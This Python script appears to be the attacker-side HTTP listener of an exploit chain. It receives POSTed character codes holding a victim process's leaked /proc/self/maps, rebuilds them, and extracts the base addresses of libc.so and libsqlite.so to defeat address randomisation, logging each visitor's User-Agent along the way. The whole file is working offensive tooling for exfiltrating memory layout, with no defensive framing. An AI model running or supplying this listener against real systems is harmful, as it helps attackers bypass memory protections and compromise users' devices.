import http.server
import socketserver

PORT = 8080

current_leak = ''
end_index = -1
lib_bases = {}
libs_to_leak = ['libc.so', 'libsqlite.so']

def get_lib_base(lib_name: str, proc_maps: str) -> int | None:
    lib_parts = [line for line in proc_maps.split('\n') if lib_name in line]
    if len(lib_parts) == 0:
        return None
    return int(lib_parts[0].split('-')[0], 16)

class LoggingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        user_agent = self.headers.get('User-Agent', 'Unknown')
        print(f"[+] User-Agent: {user_agent}")
        super().do_GET()

    def do_HEAD(self):
        user_agent = self.headers.get('User-Agent', 'Unknown')
        print(f"[+] User-Agent (HEAD): {user_agent}")
        super().do_HEAD()

    def do_POST(self):
        global current_leak
        global end_index
        user_agent = self.headers.get('User-Agent', 'Unknown')
        print(f"[+] User-Agent (POST): {user_agent}")
        print(f"[+] POST URL Path: {self.path}")

        try:
            n = int(self.path[1:])
        except:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"POST received\n")

        if n != end_index:
            print('restarting leak')
            current_leak = ''
            end_index = n

        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b''
        body = post_data.decode('utf-8', errors='replace')
        body_text = ''.join(chr(int(n)) for n in body.split(','))
        current_leak += body_text
        end_index += len(body_text)

        print('currently leaked /proc/self/maps:')
        print(current_leak)

        leak_failed = False
        for lib in libs_to_leak:
            leak = get_lib_base(lib, current_leak)
            if leak is not None:
                print(f'leaked {lib} base: {hex(leak)}')
                lib_bases[lib] = leak
            elif lib not in lib_bases:
                leak_failed = True

        if not leak_failed:
            print('all libs bases leaked')
            print(lib_bases)

        # Respond with 200 OK
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"POST received\n")

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), LoggingHTTPRequestHandler) as httpd:
        print(f"[+] Serving HTTP on port {PORT}")
        httpd.serve_forever()
